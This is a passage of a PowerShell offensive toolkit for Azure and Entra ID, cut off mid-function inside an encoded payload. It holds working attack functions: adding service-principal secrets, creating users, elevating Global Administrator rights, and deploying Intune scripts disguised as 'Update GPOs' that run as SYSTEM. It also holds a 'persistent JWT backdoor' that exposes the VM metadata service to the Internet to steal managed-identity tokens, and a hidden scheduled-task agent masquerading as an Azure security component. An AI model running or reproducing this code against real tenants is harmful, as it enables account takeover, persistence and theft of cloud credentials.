    $sps = Get-AzADApplication | Where-Object {$_.HomePage -Match 'automationAccounts'} | Get-AzADServicePrincipal
	$obj | Add-Member -MemberType NoteProperty -Name AutomationAccount -Value $aaname
    $obj | Add-Member -MemberType NoteProperty -Name AppName -Value $apps.DisplayName
    $obj | Add-Member -MemberType NoteProperty -Name AppObjectId -Value $apps.ObjectId
    $obj | Add-Member -MemberType NoteProperty -Name ApplicationId -Value $apps.ApplicationId
    $obj | Add-Member -MemberType NoteProperty -Name ServicePrincipalName -Value $sps.DisplayName
    $obj | Add-Member -MemberType NoteProperty -Name ServicePrincipalId -Value $sps.Id
    $obj}
    else{
    Write-Host "No RunAs Accounts found" -ForegroundColor yellow
    }
}

function Get-AzureAppOwner
{
<#
.SYNOPSIS 
Returns all owners of all applications in AAD

.EXAMPLE
Get-AzureAppOwners
#>
    $Headers = Get-AzureGraphToken
	$Uri = 'https://graph.microsoft.com/beta/applications'
	$appdata = Invoke-RestMethod -Headers $Headers -Uri $Uri
	$apps = $appdata.value
	ForEach($app in $apps)
	{
		$id = $app.id
		$Owners = Invoke-RestMethod -Headers $Headers -Uri "https://graph.microsoft.com/beta/applications/$id/owners"
		If($Owners.value.userPrincipalName)
		{
            $obj = New-Object -TypeName psobject
            $obj | Add-Member -MemberType NoteProperty -Name AppName -Value $app.DisplayName
            $obj | Add-Member -MemberType NoteProperty -Name OwnerName -Value $Owners.value.userPrincipalName
            $obj
		}
	}
}

function Add-AzureSPSecret
{
<# 
.SYNOPSIS
    Adds a secret to a service principal. The secret is auto generated and will be shown. It is not retrievable after being displayed.

.PARAMETERS
    -ApplicationName (Name of Application the SP is tied to)
	
.EXAMPLE
	Add-AzureSPSecret -ApplicationName "ApplicationName"
#>
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true)][String]$ApplicationName = $null)
    $Headers = Get-AzureGraphToken 
    $App = Get-AzADApplication -DisplayName $ApplicationName    
    $Uri = 'https://graph.microsoft.com/beta/applications/' + $App.ObjectId + '/addPassword'
    $Body = [PSCustomObject]@{
        passwordCredential = @{displayName="TestPass"}
    }
    $json = $Body | ConvertTo-Json
    $Req = Invoke-RestMethod -Method POST -Uri $Uri -Body $json -Headers $Headers -ContentType 'application/json'
    $Context = Get-AzContext
    $f1 = '$ApplicationId = "' + $App.ApplicationId + '"'
    $f2 = '$SecurePassword = "' + $Req.secretText + '"'
    $f3 = '$SecurePassword = ConvertTo-SecureString -String $SecurePassword -AsPlainText -Force'
	If($Req)
	{
		Write-Host "Success! You can now login as the service principal using the following command block:" -ForegroundColor Green
		Write-Host ""
        Write-Host $f1 -ForegroundColor Yellow
        Write-Host $f2 -ForegroundColor Yellow
        Write-Host $f3 -ForegroundColor Yellow
        Write-Host '$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $ApplicationId, $SecurePassword' -ForegroundColor Yellow
		Write-Host 'Connect-AzAccount -Credential $Credential -Tenant '$Context.Tenant.Id' -ServicePrincipal' -ForegroundColor Yellow
	}
}

function New-AzureUser
{
<# 
.SYNOPSIS
    Creates a user in Azure Active Directory

.PARAMETERS
	-Username (test@test.com)
	-Password (Password1234)
	
.EXAMPLE
	New-AzureUser -Username 'test@test.com' -Password Password1234
#>
    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$true, HelpMessage='Enter the username with the domain')][String]$Username = $null,
	[Parameter(Mandatory=$true, HelpMessage='Enter a password for the user')][String]$Password = $null)

	If($Username -notmatch '@')
	{
	Write-Host "Please supply the domain name the user will be added under, e.g. test@test.com" -ForegroundColor Red
	}
	else
	{
        $Context = Get-AzContext
        $name = $Username.Split('@')[0]
        $SecurePassword =  ConvertTo-SecureString $Password -AsPlainText -Force
	    $make = New-AzADUser -UserPrincipalName $Username -Password $SecurePassword -DisplayName $name -MailNickname $name
	    If($make)
	    {
		    Write-Host "Success! Please login with:" -ForegroundColor Green
		    Write-Host '$Credential = Get-Credential; Connect-AzAccount -Credential $Credential -Tenant '$Context.Tenant.Id'' -ForegroundColor Yellow
	    }
    }	
}

function Set-AzureElevatedPrivileges
{
<# 
.SYNOPSIS
    Elevates the user's privileges from Global Administrator in AzureAD to include User Access Administrator in Azure RBAC.
	
.EXAMPLE
	Set-ElevatedPrivileges
#>
	$req = Invoke-AzRestMethod -Path /providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01 -Method POST
	If($req -eq '')
	{
		Write-Host "Success! Re-login for permissions to take effect. You can now add yourself as an Owner to any resources in Azure!" -ForegroundColor Green
	}
}

function Get-AzureRole
{
<# 
.SYNOPSIS
    Gets a role or all roles in Azure and their associated members.

.PARAMETERS
	-Role
	-All
	
	
.EXAMPLE
	Get-AzureRole -All
	Get-AzureRole -Role Contributor
#>
    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$false)][String]$Role = $null,
	[Parameter(Mandatory=$false)][Switch]$All = $null)
	
	If($All)
	{
		$list = Get-AzRoleAssignment
		$rolenames = $list.RoleDefinitionName | Sort-Object | Get-Unique
		ForEach($rolename in $rolenames)
		{

            $definitions = Get-AzRoleDefinition -Name $rolename
			$rolelist = Get-AzRoleAssignment -RoleDefinitionname $rolename
			$obj = New-Object -TypeName psobject
            $obj | Add-Member -MemberType NoteProperty -Name RoleName -Value $rolename 	
            $obj | Add-Member -MemberType NoteProperty -Name RoleId -Value $definitions.Id 
			$obj | Add-Member -MemberType NoteProperty -Name Username -Value $rolelist.SignInName
			$obj | Add-Member -MemberType NoteProperty -Name UserId -Value $rolelist.ObjectId
			$obj | Add-Member -MemberType NoteProperty -Name Scope -Value $rolelist.Scope
			$obj  		
		}
	}
	
	If($Role)
	{
        $definitions = Get-AzRoleDefinition -Name $role
		$rolelist = Get-AzRoleAssignment -RoleDefinitionname $role
		$obj = New-Object -TypeName psobject
        $obj | Add-Member -MemberType NoteProperty -Name RoleName -Value $Role 	
        $obj | Add-Member -MemberType NoteProperty -Name RoleId -Value $definitions.Id 
		$obj | Add-Member -MemberType NoteProperty -Name Username -Value $rolelist.SignInName
		$obj | Add-Member -MemberType NoteProperty -Name UserId -Value $rolelist.ObjectId
		$obj | Add-Member -MemberType NoteProperty -Name Scope -Value $rolelist.Scope
		$obj  					
	}
	
	If(!$Role -and !$All)
	{
	    Write-Host "Usage:" -ForegroundColor Red
        Write-Host "Get-AzureRole -Role Contributor" -ForegroundColor Red
        Write-Host "Get-AzureRole -All" -ForegroundColor Red
	}
	

}

function Add-AzureRole
{
<# 
.SYNOPSIS
    Adds a role to a user in Azure RBAC

.PARAMETERS
	-Role
	-Username
    -Scope  
	
	
.EXAMPLE
	Add-AzureRole -Role 'Contributor' -Username test@contoso.com -Scope "/subscriptions/86f81fc3-b00f-48cd-8218-3879f51ff362"
#>
    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$true)][String]$Role = $null,
    [Parameter(Mandatory=$true)][String]$Scope = $null,
	[Parameter(Mandatory=$true)][Switch]$Username = $null)
    New-AzRoleAssignment -SignInName $Username -RoleDefinitionName $Role -Scope $Scope
}

function Get-AzureIntuneScript
{
<# 
.SYNOPSIS
    Lists the scripts available in InTune. 
	
.EXAMPLE
	Get-AzureInTuneScript
#>
$m = Get-Module -Name Microsoft.Graph.Intune -ListAvailable
if (-not $m)
{
    Install-Module NuGet -Force
    Install-Module Microsoft.Graph.Intune
}
Import-Module Microsoft.Graph.Intune -Global
Connect-MSGraph -AdminConsent | Out-Null
$req = Invoke-MSGraphRequest -Url "https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts" -HttpMethod GET
$req.value 
}

function New-AzureIntuneScript
{
<# 
.SYNOPSIS
    Creates a new script in Intune by uploading a supplied script

.PARAMETERS
	-Script (Full path to script)	
	
.EXAMPLE
	New-AzureIntuneScript -Script 'C:\temp\test.ps1'
#>
    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$true)][String]$Script = $null)

$m = Get-Module -Name Microsoft.Graph.Intune -ListAvailable
if (-not $m)
{
    Install-Module NuGet -Force
    Install-Module Microsoft.Graph.Intune
}
Import-Module Microsoft.Graph.Intune -Global
Connect-MSGraph -AdminConsent | Out-Null
$ScriptName = 'Update-GPO'
$Params = @{
    ScriptName = $ScriptName
    ScriptContent = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content -Path "$Script" -Raw -Encoding UTF8)))
    DisplayName = "Update GPOs"
    Description = "Updates group policies"
    RunAsAccount = "system"
    EnforceSignatureCheck = "false"
    RunAs32Bit = "false"
}
$Json = @"
{
    "@odata.type": "#microsoft.graph.deviceManagementScript",
    "displayName": "$($params.DisplayName)",
    "description": "$($Params.Description)",
    "scriptContent": "$($Params.ScriptContent)",
    "runAsAccount": "$($Params.RunAsAccount)",
    "enforceSignatureCheck": $($Params.EnforceSignatureCheck),
    "fileName": "$($Params.ScriptName)",
    "runAs32Bit": $($Params.RunAs32Bit)
}
"@
Invoke-MSGraphRequest -HttpMethod POST -Url "https://graph.microsoft.com/beta/deviceManagement/deviceManagementScripts" -Content $Json

}

function Get-AzureLogicAppConnector
{
<# 
.SYNOPSIS
    Lists the connectors used in Logic Apps

.PARAMETERS
	-Script (Full path to script)	
	
.EXAMPLE
	New-AzureIntuneScript -Script 'C:\temp\test.ps1'
#>

Get-AzResource | Where-Object {$_.ResourceType -eq 'Microsoft.Web/Connections' -and $_.ResourceId -match 'azuread'}
}
function Get-AzureDeviceOwner
{
<# 
.SYNOPSIS
    Lists the owners of devices in AAD. This will only show devices that have an owner.
	
.EXAMPLE
	Get-AzureDeviceOwners
#>

    $AADDevices =  Get-AzureADDevice | ?{$_.DeviceOSType -Match "Windows" -Or $_.DeviceOSType -Match "Mac"}
	$AADDevices | ForEach-Object {

        $Device = $_
        $DisplayName = $Device.DisplayName
        $Owner = Get-AzureADDeviceRegisteredOwner -ObjectID $Device.ObjectID   
        If($Owner){    
            $AzureDeviceOwner = [PSCustomObject]@{
                DeviceDisplayname   = $Device.Displayname
                DeviceID            = $Device.ObjectID
                DeviceOS            = $Device.DeviceOSType
                OwnerDisplayName    = $Owner.Displayname
                OwnerID             = $Owner.ObjectID
                OwnerType           = $Owner.ObjectType
                OwnerOnPremID       = $Owner.OnPremisesSecurityIdentifier
            
            }
            $AzureDeviceOwner
        }       
	}
}

function Invoke-AzureMIBackdoor
{
<# 
.SYNOPSIS
    Creates a managed identity for a VM and exposes the REST API on it to make it a persistent JWT backdoor generator.

.PARAMETERS
	-VM (Name of VM)
	-Scope (Scope of the role)
	-Role (Role to apply over the supplied scope)
	
.EXAMPLE
	Invoke-AzureMIBackdoor -VM Win10 -Role Contributor -Scope '/subscriptions/fa2cd1e3-abcd-efghi-jlmnop-0c81f66381d5/'
#>	
	$vmobj = Get-AzVM -Name $VM
	$rg = $vm.ResourceGroupName
	Write-Host "Creating Managed Identity Service Principal..." -ForegroundColor Yellow
	$add = Update-AzVM -ResourceGroupName $rg -VM $vm -IdentityType SystemAssigned
	$sp = Get-AzADServicePrincipal -displayname $vm.name
	$id = $sp.id
	$AID = $sp.applicationid
	$roleadd = New-AzRoleAssignment -ObjectId $id -RoleDefinitionName $role -Scope $scope
	If($roleadd.RoleDefinitionName -eq $role){
		$Command = '$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DHCPEnabled -ne $null -and $_.DefaultIPGateway -ne $null}).IPAddress[0] ;netsh interface portproxy add v4tov4 listenport=3389 listenaddress=$ip connectport=80 connectaddress=169.254.169.254'
		$new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $Command -Force
		$path = $new.DirectoryName + '\' + $new.Name 
		$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
		$result.value.Message
		rm $path
	}
}
function Invoke-AzureMIBackdoor
{
<# 
.SYNOPSIS
    Creates a managed identity for a VM and exposes the REST API on it to make it a persistent JWT backdoor generator.

.PARAMETERS
	-VM (Name of VM)
	-Scope (Scope of the role)
	-Role (Role to apply over the supplied scope)
	-NoRDP (Open up port 80 on the NSG to avoid using 3389)
	
.EXAMPLE
	Invoke-AzureMIBackdoor -VM Win10 -Role Contributor -Scope '/subscriptions/fa2cd1e3-abcd-efghi-jlmnop-0c81f66381d5/'
#>	
    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$true)][String]$VM = $null,
	[Parameter(Mandatory=$false)][Switch]$NoRDP = $false,
	[Parameter(Mandatory=$true)][String]$Scope = $null,
	[Parameter(Mandatory=$true)][String]$Role = $null)

	$vmobj = Get-AzVM -Name $VM
	$rg = $vmobj.ResourceGroupName
	Write-Host "Creating Managed Identity Service Principal..." -ForegroundColor Yellow
	$add = Update-AzVM -ResourceGroupName $rg -VM $vmobj -IdentityType SystemAssigned
	$sp = Get-AzADServicePrincipal -displayname $vm
	If($sp){
		Write-Host "Created Managed Identity Service Principal $vm!" -ForegroundColor Green
	}
	$id = $sp.id	
	$roleadd = New-AzRoleAssignment -ObjectId $id -RoleDefinitionName $role -Scope $scope
	If($roleadd){
		If($NoRDP){
			$NSG = Get-AzNetworkSecurityGroup -Name $VM*
			Add-AzNetworkSecurityRuleConfig -Access Allow -DestinationAddressPrefix * -DestinationPortRange 80 -Direction Inbound -Name HTTP -Priority 101 -Protocol Tcp -SourceAddressPrefix 'Internet' -SourcePortRange * -NetworkSecurityGroup $NSG | Set-AzNetworkSecurityGroup
			$Command = '$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DHCPEnabled -ne $null -and $_.DefaultIPGateway -ne $null}).IPAddress[0] ;netsh interface portproxy add v4tov4 listenport=80 listenaddress=$ip connectport=80 connectaddress=169.254.169.254'
			$new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $Command -Force
			$path = $new.DirectoryName + '\' + $new.Name 
			Write-Host "Modifying Port Proxying rules..." -ForegroundColor Yellow
			$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
			rm $path
			If($change.value.displaystatus[1] -eq 'Provisioning succeeded'){
				$name = $VM + '*-ip'
				$ipobj =  Get-AzPublicIpAddress -Name $name
				$ip = $ipobj.ipaddress
				$uri = 'http://' + $ip +'/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
				$request =  "Invoke-WebRequest -Uri '" + $uri + "' -Method GET -Headers @{Metadata='true'}"
				Write-Host "Successfully modified port proxy rule. You can request the JWT for $vm Service Principal at:" -ForegroundColor Green
				Write-Host $request
				$prompt = Read-Host "Login with JWT Now? [Y]/[N]"
				If($prompt -eq 'Y' -or $prompt -eq 'Yes'){
						$requestdata = Invoke-WebRequest -Uri $uri -Method GET -Headers @{Metadata='true'}
						$tokendata = $requestdata.Content
						Connect-AzureJWT -Token $tokendata -AccountID $id -Raw
					}	
				}			
			}	
		else{
			$Command = '$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DHCPEnabled -ne $null -and $_.DefaultIPGateway -ne $null}).IPAddress[0] ;netsh interface portproxy add v4tov4 listenport=3389 listenaddress=$ip connectport=80 connectaddress=169.254.169.254'
			$new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $Command -Force
			$path = $new.DirectoryName + '\' + $new.Name 
			Write-Host "Modifying Port Proxying rules..." -ForegroundColor Yellow
			$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
			rm $path
			If($change.value.displaystatus[1] -eq 'Provisioning succeeded'){
			$name = $VM + '*-ip'
			$ipobj =  Get-AzPublicIpAddress -Name $name
			$ip = $ipobj.ipaddress
			$uri = 'http://' + $ip +':3389/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
			$request =  "Invoke-WebRequest -Uri '" + $uri + "' -Method GET -Headers @{Metadata='true'}"
			Write-Host "Successfully modified port proxy rule. You can request the JWT for $vm Service Principal at:" -ForegroundColor Green
			Write-Host $request
			$prompt = Read-Host "Login with JWT Now? [Y]/[N]"
			If($prompt -eq 'Y' -or $prompt -eq 'Yes'){
					$requestdata = Invoke-WebRequest -Uri $uri -Method GET -Headers @{Metadata='true'}
					$tokendata = $requestdata.Content
					Connect-AzureJWT -Token $tokendata -AccountID $id -Raw
				}	
			}		
		}
	}
}

function Connect-AzureJWT
<# 
.SYNOPSIS
    Logins to Azure using a JWT access token. Use -Raw to supply an unstructured token from a Managed Identity token request.

.PARAMETERS
	-Token (Access token)
	-AccountID (Account's ID in AzureAD. This will not be the Application ID in the case for Service Principals but the actual account ID.)
	-Raw (This will convert a REST API response to a token when gathering a token from a Managed Identity.)
	
.EXAMPLE
	$token = 'eyJ0eXAiOiJKV1QiLC....(snip)'
	Connect-AzureJWT -Token $token -AccountId 93f7295a-1243-1234-1234-1a1fa41560e8
	
	Connect-AzureJWT -Token $token -AccountId 93f7295a-678e-44d2-b705-1a1fa41560e8 -Raw
#>	
{
    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$true)][String]$Token = $null,
	[Parameter(Mandatory=$true)][String]$AccountID = $null,
	[Parameter(Mandatory=$False)][Switch]$Raw = $false)
		
	If($Raw)
	{
	$content = $Token | ConvertFrom-Json	
	$ArmToken = $content.access_token	
	Connect-AzAccount -AccessToken $ArmToken -AccountId $AccountID
	}
	else{
	Connect-AzAccount -AccessToken $Token -AccountId $AccountID
	}
}

function Get-AzureManagedIdentities
<# 
.SYNOPSIS
    Gathers all Managed Identities and lists their role & scope.
#>
{
	$Headers = Get-AzureGraphToken 
	$Login = Connect-AADUser
	$MIs = Get-AzADServicePrincipal | where-object {$_.ServicePrincipalNames -match 'https://identity.azure.net'}
	ForEach ($MI in $MIs){
		$id = $MI.id
		$uri = 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?$filter=principalId' +' eq ' + "'" + $id + "'"
		$user = Invoke-RestMethod -Headers $Headers -Uri $uri
		$userdata = $user.value
		$roledefid = $userdata.roleDefinitionId
		$roledata = Invoke-RestMethod -Headers $Headers -Uri https://graph.microsoft.com/beta/roleManagement/directory/roleDefinitions/$roledefid
		$rolename = $roledata.displayName
		$RA = Get-AzRoleAssignment -ObjectId $MI.Id
		$Obj = [PSCustomObject]@{
		ManagedIdentityName = $MI.Displayname
		AzRoleAssignment = $RA.RoleDefinitionName
		AzScope = $RA.Scope
		AzADRoleAssignment = $rolename
		AzADScope = $userdata.resourceScope
		}
		$Obj | fl
	}
}

function Invoke-AzureVMUserDataCommand
{
<# 
.SYNOPSIS
    Executes a command using the userData channel on a specified Azure VM.

.PARAMETERS
	-Command (Command to run)
	-VM (Virtual machine name)
	
.EXAMPLE
	Invoke-AzureVMUserDataCommand -VM Windows10 -Command ls
#>	
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true)][String]$Command = $null,
    [Parameter(Mandatory=$true)][String]$VM = $null)
	$Command
	$token = Get-AzAccessToken
	$Resource = Get-AzResource -Name $VM
	$ResourceID = $Resource.ResourceId
	$Headers = @{}
    $Headers.Add("Authorization","Bearer"+ " " + "$($token.token)") 
	$FullCommand = $Command + '%' + $token.token + '%' + $ResourceID
	$Bytes = [System.Text.Encoding]::Unicode.GetBytes($FullCommand)
	$EncodedText =[Convert]::ToBase64String($Bytes)
	$json = '{"properties": { "userData": ' + '"' + $EncodedText + '",	}}'
	$Uri = 'https://management.azure.com/' + $ResourceID + '?api-version=2021-07-01'
	$RestMethod = Invoke-RestMethod -Method PATCH -Uri $uri -Body $Json -Header $Headers -ContentType 'application/json'
	$Uri = 'https://management.azure.com/' + $ResourceID + '?$expand=userdata&api-version=2021-07-01'
	$RestMethod = Invoke-RestMethod -Method GET -Uri $uri -Header $Headers
	$userdata = $RestMethod.properties.userData
	$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($userdata))
    While($decoded -eq $FullCommand){
        $RestMethod = Invoke-RestMethod -Method GET -Uri $uri -Header $Headers
	    $userdata = $RestMethod.properties.userData
	    $decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($userdata))
    }
    $decoded
}

function Invoke-AzureVMUserDataAgent
{
<# 
.SYNOPSIS
    Deploys the agent used by Invoke-AzureVMUserDataCommand

.PARAMETERS

	-VM (Virtual machine name)
	
.EXAMPLE
	Invoke-AzureVMUserDataAgent -VM Win10
#>	
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$true)][String]$VM = $null)
	$vmobj = Get-AzVM -Name $VM
	$rg = $vmobj.ResourceGroupName
	$data = @'
$ErrorActionPreference= 'silentlycontinue'
If('C:\WindowsAzure\SecAgent\AzureInstanceMetadataService.ps1'){Copy-Item -Path $PSCommandPath -Destination 'C:\WindowsAzure\SecAgent\AzureInstanceMetadataService.ps1'
}
$task = 'PAA/AHgAbQBsACAAdgBlAHIAcwBpAG8AbgA9ACIAMQAuADAAIgAgAGUAbgBjAG8AZABpAG4AZwA9ACIAVQBUAEYALQAxADYAIgA/AD4ACgA8AFQAYQBzAGsAIAB2AGUAcgBzAGkAbwBuAD0AIgAxAC4ANAAiACAAeABtAGwAbgBzAD0AIgBoAHQAdABwADoALwAvAHMAYwBoAGUAbQBhAHMALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AdwBpAG4AZABvAHcAcwAvADIAMAAwADQALwAwADIALwBtAGkAdAAvAHQAYQBzAGsAIgA+AAoAIAAgADwAUgBlAGcAaQBzAHQAcgBhAHQAaQBvAG4ASQBuAGYAbwA+AAoAIAAgACAAIAA8AEQAYQB0AGUAPgAyADAAMgAxAC0AMQAyAC0AMAAyAFQAMgAxADoAMwAxADoAMgAyAC4AMwAxADcAMgA0ADIANQA8AC8ARABhAHQAZQA+AAoAIAAgACAAIAA8AEEAdQB0AGgAbwByAD4ATQBpAGMAcgBvAHMAbwBmAHQAIABDAG8AcgBwAG8AcgBhAHQAaQBvAG4APAAvAEEAdQB0AGgAbwByAD4ACgAgACAAIAAgADwAVQBSAEkAPgBcAEEAegB1AHIAZQAgAEkAbgBzAHQAYQBuAGMAZQAgAE0AZQB0AGEAZABhAHQAYQAgAFMAZQByAHYAaQBjAGUAIABRAHUAZQByAHkAPAAvAFUAUgBJAD4ACgAgACAAPAAvAFIAZQBnAGkAcwB0AHIAYQB0AGkAbwBuAEkAbgBmAG8APgAKACAAIAA8AFQAcgBpAGcAZwBlAHIAcwA+AAoAIAAgACAAIAA8AEUAdgBlAG4AdABUAHIAaQBnAGcAZQByAD4ACgAgACAAIAAgACAAIAA8AEUAeABlAGMAdQB0AGkAbwBuAFQAaQBtAGUATABpAG0AaQB0AD4AUABUADUATQA8AC8ARQB4AGUAYwB1AHQAaQBvAG4AVABpAG0AZQBMAGkAbQBpAHQAPgAKACAAIAAgACAAIAAgADwARQBuAGEAYgBsAGUAZAA+AHQAcgB1AGUAPAAvAEUAbgBhAGIAbABlAGQAPgAKACAAIAAgACAAIAAgADwAUwB1AGIAcwBjAHIAaQBwAHQAaQBvAG4APgAmAGwAdAA7AFEAdQBlAHIAeQBMAGkAcwB0ACYAZwB0ADsAJgBsAHQAOwBRAHUAZQByAHkAIABJAGQAPQAiADAAIgAgAFAAYQB0AGgAPQAiAE0AaQBjAHIAbwBzAG8AZgB0AC0AVwBpAG4AZABvAHcAcwBBAHoAdQByAGUALQBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALwBHAHUAZQBzAHQAQQBnAGUAbgB0ACIAJgBnAHQAOwAmAGwAdAA7AFMAZQBsAGUAYwB0ACAAUABhAHQAaAA9ACIATQBpAGMAcgBvAHMAbwBmAHQALQBXAGkAbgBkAG8AdwBzAEEAegB1AHIAZQAtAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAvAEcAdQBlAHMAdABBAGcAZQBuAHQAIgAmAGcAdAA7ACoAWwBTAHkAcwB0AGUAbQBbAFAAcgBvAHYAaQBkAGUAcgBbAEAATgBhAG0AZQA9ACcAVwBpAG4AZABvAHcAcwBBAHoAdQByAGUALQBHAHUAZQBzAHQAQQBnAGUAbgB0AC0ATQBlAHQAcgBpAGMAcwAnAF0AIABhAG4AZAAgAEUAdgBlAG4AdABJAEQAPQA3AF0AXQAmAGwAdAA7AC8AUwBlAGwAZQBjAHQAJgBnAHQAOwAmAGwAdAA7AC8AUQB1AGUAcgB5ACYAZwB0ADsAJgBsAHQAOwAvAFEAdQBlAHIAeQBMAGkAcwB0ACYAZwB0ADsAPAAvAFMAdQBiAHMAYwByAGkAcAB0AGkAbwBuAD4ACgAgACAAIAAgADwALwBFAHYAZQBuAHQAVAByAGkAZwBnAGUAcgA+AAoAIAAgACAAIAA8AFIAZQBnAGkAcwB0AHIAYQB0AGkAbwBuAFQAcgBpAGcAZwBlAHIAPgAKACAAIAAgACAAIAAgADwARQBuAGEAYgBsAGUAZAA+AHQAcgB1AGUAPAAvAEUAbgBhAGIAbABlAGQAPgAKACAAIAAgACAAPAAvAFIAZQBnAGkAcwB0AHIAYQB0AGkAbwBuAFQAcgBpAGcAZwBlAHIAPgAKACAAIAA8AC8AVAByAGkAZwBnAGUAcgBzAD4ACgAgACAAPABQAHIAaQBuAGMAaQBwAGEAbABzAD4ACgAgACAAIAAgADwAUAByAGkAbgBjAGkAcABhAGwAIABpAGQAPQAiAEEAdQB0AGgAbwByACIAPgAKACAAIAAgACAAIAAgADwAVQBzAGUAcgBJAGQAPgBTAC0AMQAtADUALQAxADgAPAAvAFUAcwBlAHIASQBkAD4ACgAgACAAIAAgACAAIAA8AFIAdQBuAEwAZQB2AGUAbAA+AEgAaQBnAGgAZQBzAHQAQQB2AGEAaQBsAGEAYgBsAGUAPAAvAFIAdQBuAEwAZQB2AGUAbAA+AAoAIAAgACAAIAA8AC8AUAByAGkAbgBjAGkAcABhAGwAPgAKACAAIAA8AC8AUAByAGkAbgBjAGkAcABhAGwAcwA+AAoAIAAgADwAUwBlAHQAdABpAG4AZwBzAD4ACgAgACAAIAAgADwATQB1AGwAdABpAHAAbABlAEkAbgBzAHQAYQBuAGMAZQBzAFAAbwBsAGkAYwB5AD4AUABhAHIAYQBsAGwAZQBsADwALwBNAHUAbAB0AGkAcABsAGUASQBuAHMAdABhAG4AYwBlAHMAUABvAGwAaQBjAHkAPgAKACAAIAAgACAAPABEAGkAcwBhAGwAbABvAHcAUwB0AGEAcgB0AEkAZgBPAG4AQgBhAHQAdABlAHIAaQBlAHMAPgBmAGEAbABzAGUAPAAvAEQAaQBzAGEAbABsAG8AdwBTAHQAYQByAHQASQBmAE8AbgBCAGEAdAB0AGUAcgBpAGUAcwA+AAoAIAAgACAAIAA8AFMAdABvAHAASQBmAEcAbwBpAG4AZwBPAG4AQgBhAHQAdABlAHIAaQBlAHMAPgBmAGEAbABzAGUAPAAvAFMAdABvAHAASQBmAEcAbwBpAG4AZwBPAG4AQgBhAHQAdABlAHIAaQBlAHMAPgAKACAAIAAgACAAPABBAGwAbABvAHcASABhAHIAZABUAGUAcgBtAGkAbgBhAHQAZQA+AHQAcgB1AGUAPAAvAEEAbABsAG8AdwBIAGEAcgBkAFQAZQByAG0AaQBuAGEAdABlAD4ACgAgACAAIAAgADwAUwB0AGEAcgB0AFcAaABlAG4AQQB2AGEAaQBsAGEAYgBsAGUAPgBmAGEAbABzAGUAPAAvAFMAdABhAHIAdABXAGgAZQBuAEEAdgBhAGkAbABhAGIAbABlAD4ACgAgACAAIAAgADwAUgB1AG4ATwBuAGwAeQBJAGYATgBlAHQAdwBvAHIAawBBAHYAYQBpAGwAYQBiAGwAZQA+AGYAYQBsAHMAZQA8AC8AUgB1AG4ATwBuAGwAeQBJAGYATgBlAHQAdwBvAHIAawBBAHYAYQBpAGwAYQBiAGwAZQA+AAoAIAAgACAAIAA8AEkAZABsAGUAUwBlAHQAdABpAG4AZwBzAD4ACgAgACAAIAAgACAAIAA8AFMAdABvAHAATwBuAEkAZABsAGUARQBuAGQAPgB0AHIAdQBlADwALwBTAHQAbwBwAE8AbgBJAGQAbABlAEUAbgBkAD4ACgAgACAAIAAgACAAIAA8AFIAZQBzAHQAYQByAHQATwBuAEkAZABsAGUAPgBmAGEAbABzAGUAPAAvAFIAZQBzAHQAYQByAHQATwBuAEkAZABsAGUAPgAKACAAIAAgACAAPAAvAEkAZABsAGUAUwBlAHQAdABpAG4AZwBzAD4ACgAgACAAIAAgADwAQQBsAGwAbwB3AFMAdABhAHIAdABPAG4ARABlAG0AYQBuAGQAPgB0AHIAdQBlADwALwBBAGwAbABvAHcAUwB0AGEAcgB0AE8AbgBEAGUAbQBhAG4AZAA+AAoAIAAgACAAIAA8AEUAbgBhAGIAbABlAGQAPgB0AHIAdQBlADwALwBFAG4AYQBiAGwAZQBkAD4ACgAgACAAIAAgADwASABpAGQAZABlAG4APgB0AHIAdQBlADwALwBIAGkAZABkAGUAbgA+AAoAIAAgACAAIAA8AFIAdQBuAE8AbgBsAHkASQBmAEkAZABsAGUAPgBmAGEAbABzAGUAPAAvAFIAdQBuAE8AbgBsAHkASQBmAEkAZABsAGUAPgAKACAAIAAgACAAPABEAGkAcwBhAGwAbABvAHcAUwB0AGEAcgB0AE8AbgBSAGUAbQBvAHQAZQBBAHAAcABTAGUAcwBzAGkAbwBuAD4AZgBhAGwAcwBlADwALwBEAGkAcwBhAGwAbABvAHcAUwB0AGEAcgB0AE8AbgBSAGUAbQBvAHQAZQBBAHAAcABTAGUAcwBzAGkAbwBuAD4ACgAgACAAIAAgADwAVQBzAGUAVQBuAGkAZgBpAGUAZABTAGMAaABlAGQAdQBsAGkAbgBnAEUAbgBnAGkAbgBlAD4AdAByAHUAZQA8AC8AVQBzAGUAVQBuAGkAZgBpAGUAZABTAGMAaABlAGQAdQBsAGkAbgBnAEUAbgBnAGkAbgBlAD4AC